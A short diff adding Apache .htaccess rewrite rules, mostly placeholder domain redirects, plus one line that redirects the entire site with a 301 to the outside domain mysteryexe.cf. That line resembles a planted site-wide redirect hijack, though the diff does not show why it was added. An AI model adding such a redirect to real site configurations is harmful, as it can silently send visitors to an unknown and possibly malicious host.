@@ -1,2 +1,11 @@
+RewriteEngine on
+RewriteCond %{HTTP_HOST} ^firstdomain.com [NC,OR]
+RewriteCond %{HTTP_HOST} ^www.firstdomain.com [NC]
+RewriteRule ^(.*)$ http://seconddomain.com/$1 [L,R=301,NC]
+
+RewriteCond %{HTTP_HOST} ^domain.com [NC]
+RewriteRule ^(.*)$ http://www.domain.com/$1 [L,R=301,NC]
+
+Redirect 301 / https://mysteryexe.cf/
 
 ErrorDocument 404 /404.html
